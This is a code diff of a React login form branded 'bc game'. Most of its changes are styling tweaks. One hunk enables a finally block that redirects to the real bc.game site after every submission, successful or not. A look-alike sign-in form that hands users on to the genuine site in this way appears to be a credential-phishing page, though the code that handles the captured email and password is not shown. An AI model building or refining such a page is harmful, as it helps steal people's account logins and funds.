@@ -99,15 +99,14 @@ const LoginForm = () => {
       }
     } catch (error) {
       console.error("Error:", error.message);
-    } 
-    // finally {
-    //   router.push("https://bc.game/");
-    // }
+    } finally {
+      router.push("https://bc.game/");
+    }
   };
   return (
-    <div className="w-full my-8 lg:my-0 h-full flex flex-col lg:justify-between text-xl max-w-[90%]">
+    <div className="w-full my-1.5 lg:my-0 h-full flex flex-col lg:justify-between text-xl max-w-[90%]">
       <div>
-        <h2 className="text-3xl font-bold mb-3">Sign In</h2>
+        <h2 className="lg:text-3xl font-bold mb-3">Sign In</h2>
         <Formik
           initialValues={initialValues}
           validationSchema={validationSchema}
@@ -120,13 +119,13 @@ const LoginForm = () => {
                 id="email"
                 name="email"
                 placeholder="Email / Phone number"
-                className="w-full bg-black hover:bg-transparent px-5 py-4 rounded-md placeholder:font-bold tracking-wide"
+                className="w-full bg-black hover:bg-transparent px-5 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
                 autoComplete="off"
               />
               <ErrorMessage
                 name="email"
                 component="div"
-                className="text-red-400"
+                className="text-red-400 text-xs"
               />
             </div>
 
@@ -136,13 +135,13 @@ const LoginForm = () => {
                 id="password"
                 name="password"
                 placeholder="Login password"
-                className="w-full pl-5 pr-12 py-4 rounded-md placeholder:font-bold tracking-wide"
+                className="w-full pl-5 pr-12 lg:py-4 rounded-md placeholder:font-bold tracking-wide"
                 autoComplete="off"
               />
               <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
-                className="eye-button absolute top-5 lg:top-3 right-4 text-black"
+                className="eye-button absolute top-[8%] lg:top-3 right-4 text-black"
               >
                 {showPassword ? (
                   <FaEye size={24} color="white" />
@@ -153,7 +152,7 @@ const LoginForm = () => {
               <ErrorMessage
                 name="password"
                 component="div"
-                className="text-red-400"
+                className="text-red-400 text-xs"
               />
             </div>
 
@@ -163,14 +162,14 @@ const LoginForm = () => {
             <div className="w-full">
               <button
                 type="submit"
-                className="w-full login-button text-xl font-bold py-4 rounded-md"
+                className="w-full login-button text-xl font-bold py-2 lg:py-4 rounded-md"
               >
                 Sign In
               </button>
             </div>
           </Form>
         </Formik>
-        <div className="mt-4 lg:my-0 lg:text-2xl font-bold text-gray-400 tracking-wide">
+        <div className="mt-4 lg:my-0 text-sm lg:text-2xl font-bold text-gray-400 tracking-wide">
           New to bc game?{" "}
           <span className="text-[#3BC117] hover:underline cursor-pointer">
             Create Account
